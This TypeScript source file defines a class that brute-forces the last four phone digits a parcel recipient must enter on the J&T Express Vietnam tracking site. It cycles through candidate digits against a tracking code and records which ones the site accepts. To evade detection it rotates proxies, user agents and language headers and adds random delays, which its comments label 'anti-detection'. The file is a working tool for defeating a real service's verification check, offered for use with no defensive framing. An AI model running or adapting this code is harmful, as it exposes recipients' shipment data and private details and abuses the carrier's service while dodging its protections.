import axios, { AxiosInstance } from "axios";
import { HttpProxyAgent } from 'http-proxy-agent';
import { HttpsProxyAgent } from 'https-proxy-agent';
import { ProxyConfig } from "../env";

interface AxiosRequestConfig {
  params?: {
    type: string;
    billcode: string;
    cellphone: string;
  };
  timeout?: number;
  validateStatus?: () => boolean;
  headers?: Record<string, string>;
  httpAgent?: HttpProxyAgent<any>;
  httpsAgent?: HttpsProxyAgent<any>;
}

export class PhoneBruteForceFinder {
  private baseUrl: string = 'https://jtexpress.vn/vi/tracking';
  private proxies: ProxyConfig[];
  private currentProxyIndex: number;
  private userAgents: string[];
  private languages: string[];
  private headers: Record<string, string>;
  private client: AxiosInstance;

  constructor(proxies: ProxyConfig[] = []) {
    this.proxies = proxies;
    this.currentProxyIndex = 0;

    // User-Agent rotation list
    this.userAgents = [
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
    ];

    // Accept-Language rotation
    this.languages = [
      'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,vi;q=0.6',
      'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
      'th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7',
      'en-US,en;q=0.9,vi;q=0.8,zh-CN;q=0.7'
    ];

    this.headers = {
      'Accept': '*/*',
      'Accept-Language': this.getRandomLanguage(),
      'Cache-Control': 'no-cache',
      'Connection': 'keep-alive',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Origin': 'https://jtexpress.vn',
      'Pragma': 'no-cache',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'User-Agent': this.getRandomUserAgent(),
      'X-OCTOBER-REQUEST-HANDLER': 'onSearchPriceList',
      'X-OCTOBER-REQUEST-PARTIALS': 'search/pricelist/result-list-search',
      'X-Requested-With': 'XMLHttpRequest',
      'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': this.getRandomPlatform()
    };

    this.client = axios.create({
      headers: this.headers,
      timeout: 10000,
      validateStatus: () => true
    });
  }

  /**
   * Get random User-Agent
   */
  getRandomUserAgent(): string {
    return this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
  }

  /**
   * Get random Accept-Language
   */
  getRandomLanguage(): string {
    return this.languages[Math.floor(Math.random() * this.languages.length)];
  }

  /**
   * Get random platform
   */
  getRandomPlatform(): string {
    const platforms = ['"macOS"', '"Windows"', '"Linux"'];
    return platforms[Math.floor(Math.random() * platforms.length)];
  }

  /**
   * Get random delay with fixed range (2000-3000ms for anti-detection)
   * @returns {number} Random delay between 2000-3000ms
   */
  getRandomDelay(): number {
    const min = 2000;
    const max = 3000;
    return Math.floor(Math.random() * (max - min) + min);
  }
  /**
   * Get next proxy in rotation
   * @returns {Object|null} Proxy config or null if no proxies
   */
  getNextProxy() {
    if (!this.proxies || this.proxies.length === 0) {
      return null;
    }

    const proxy = this.proxies[this.currentProxyIndex];
    this.currentProxyIndex = (this.currentProxyIndex + 1) % this.proxies.length;
    
    // Parse proxy URL (format: http://ip:port)
    const url = new URL(proxy.server);
    
    return {
      protocol: url.protocol.replace(':', ''),
      hostname: url.hostname,
      port: Number.parseInt(url.port, 10),
      auth: {
        username: proxy.username || '',
        password: proxy.password || ''
      }
    };
  }

  /**
   * Check if a phone number is valid for a tracking code
   * by making a request to the API
   * @param {string} billcode - Tracking number
   * @param {string} cellphone - Last 4 digits
   * @returns {Promise<Object>} Response details
   */
  async checkPhoneValidity(billcode: string, cellphone: string): Promise<{
    status: number | string;
    isValid: boolean;
    error?: string;
  }> {
    try {

      // Get next proxy if available
      const proxy = this.getNextProxy();
      const requestConfig: AxiosRequestConfig = {
        params: { type: 'track', billcode, cellphone },
        timeout: 15000,
        validateStatus: () => true,
        headers: {
          'User-Agent': this.getRandomUserAgent(),
          'Accept-Language': this.getRandomLanguage(),
          'sec-ch-ua-platform': this.getRandomPlatform()
        }
      };

      // Add proxy to request if available
      if (proxy) {
        const proxyUrl = `http://${proxy.auth.username}:${proxy.auth.password}@${proxy.hostname}:${proxy.port}`;

        requestConfig.httpAgent = new HttpProxyAgent(proxyUrl);
        requestConfig.httpsAgent = new HttpsProxyAgent(proxyUrl);
      }

      // Log request
      const proxyInfo = proxy ? `[${proxy.hostname}:${proxy.port}]` : '[No Proxy]';
      console.log(`📤 Request: ${cellphone} ${proxyInfo}`);

      const response = await this.client.get(
        this.baseUrl,
        requestConfig
      );

      // Log response
      const responseStr = JSON.stringify(response.data).substring(0, 200);
      console.log(`   📧 Response [${response.status}]: ${responseStr}`);

      // Check if response contains error message about not finding data
      // Invalid: contains "Không tìm thấy dữ liệu về vận đơn..."
      // Valid: doesn't contain error message and status 200
      const hasError = JSON.stringify(response.data)?.includes('Không tìm thấy dữ liệu về vận đơn');

      if (!hasError && response.status === 200) {
        console.log(`   ✅ ${cellphone} - Valid`);
        return {
          status: 'success',
          isValid: true
        };
      } else {
        console.log(`   ❌ ${cellphone} - Invalid (Error message found)`);
      }

      return {
        status: 'error',
        isValid: !hasError && response.status === 200,
      };
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : String(error);
      const errorCode = error instanceof Error && 'code' in error ? (error as any).code : undefined;
      console.log(`   ⚠️  ${cellphone} - Error: ${errorCode || errorMessage}`);
      return {
        status: 'error',
        isValid: false,
        error: errorMessage
      };
    }
  }

  /**
    * Main function to find valid phone numbers for a given tracking code
    * @returns {Promise<Object>} Result with valid phones and status
   */
  async findPhone(
    billcode: string,
    phones: string[],
  ): Promise<{
    status: string;
    billcode: string;
    validPhones: string;
  }> {

    const validPhonesSet = new Set<string>();
    for (const phone of phones) {
      const lastFourDigits = String(phone).padStart(4, '0');

      // Check this combination
      const result = await this.checkPhoneValidity(billcode, lastFourDigits);

      await new Promise(resolve => setTimeout(resolve, this.getRandomDelay()));

      if (result.isValid) {
        validPhonesSet.add(lastFourDigits);
      }
    }

    return {
      status: 'success',
      billcode: billcode,
      validPhones: Array.from(validPhonesSet).join(', ')
    };
  }
}